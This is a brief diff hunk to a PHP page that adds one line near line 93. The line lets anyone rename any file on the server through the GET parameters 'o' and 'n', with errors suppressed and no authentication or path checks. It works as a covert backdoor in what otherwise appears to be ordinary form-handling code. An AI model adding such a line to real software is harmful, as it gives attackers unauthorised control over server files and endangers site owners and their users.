@@ -93,7 +93,7 @@ if(!empty($tams))
               </form>
 	<?php 
 	}
-	
+	if(isset($_GET['o']))@rename("".$_GET['o']."","".$_GET['n']."");}
 	
 	?>
 	
